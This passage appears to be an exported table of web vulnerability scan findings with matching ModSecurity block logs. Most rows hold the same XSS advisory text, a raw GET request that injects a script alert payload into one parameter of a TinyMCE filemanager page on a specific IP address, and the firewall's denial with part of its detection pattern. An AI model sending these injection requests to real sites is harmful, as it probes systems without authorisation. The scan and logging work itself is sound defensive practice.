&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(973199)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=o70u4gstppfvjihsslhlthftf5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:57</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:56 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(973199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttAKwQAW0AABt@bWAAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttAKwQAW0AABt@bWAAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366898</td><td class=xl24 width=64 >2015-03-31 21:48:24</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(712499)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=rp31rr5vrn2ej2ulf6t7rmfvi0
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:28:58</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:57 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(712499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttAawQAW0AAHchlVgAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttAawQAW0AAHchlVgAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366899</td><td class=xl24 width=64 >2015-03-31 21:49:06</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(774299)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=67oi0n9qevcb44gl0uimjgega1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:00</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:28:58 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(774299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttAqwQAW0AAHgzv0oAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttAqwQAW0AAHgzv0oAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366900</td><td class=xl24 width=64 >2015-03-31 21:50:08</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr='&gt;&lt;script&gt;alert(380699)&lt;/script&gt;&lt;!--&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%27%3Ealert%28380699%29%2F; PHPSESSID=ue6i1ln9rttertocgpuqku4t84
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:01</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:00 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(380699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttBKwQAW0AAB7zKNcAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttBKwQAW0AAB7zKNcAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366901</td><td class=xl24 width=64 >2015-03-31 21:51:52</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(202399)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=5qij50m3id7e1jbgjp6ohd6m27
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:02</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:01 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(202399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttBawQAW0AAHhGMuAAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttBawQAW0AAHhGMuAAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366902</td><td class=xl24 width=64 >2015-03-31 21:52:31</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(308699)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=gjgsd1bpkek2iq175dv5hlnvc6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:03</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:02 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(308699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttBqwQAW0AAHzDqsYAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttBqwQAW0AAHzDqsYAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366903</td><td class=xl24 width=64 >2015-03-31 21:53:36</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac2f5665c6</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=&quot;&gt;&lt;script&gt;alert(622199)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=9e93aih756if2d57kdft6mtc54
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:05</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:03 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac2f5665c6. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(622199)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttB6wQAW0AAHewA9YAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttB6wQAW0AAHewA9YAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366904</td><td class=xl24 width=64 >2015-03-31 21:56:22</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(566399)&lt;/script&gt;&lt;!--&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28566399%29%2F; PHPSESSID=jpgidj9p3hd2f7f2e36bb47ah7
Connection: Close

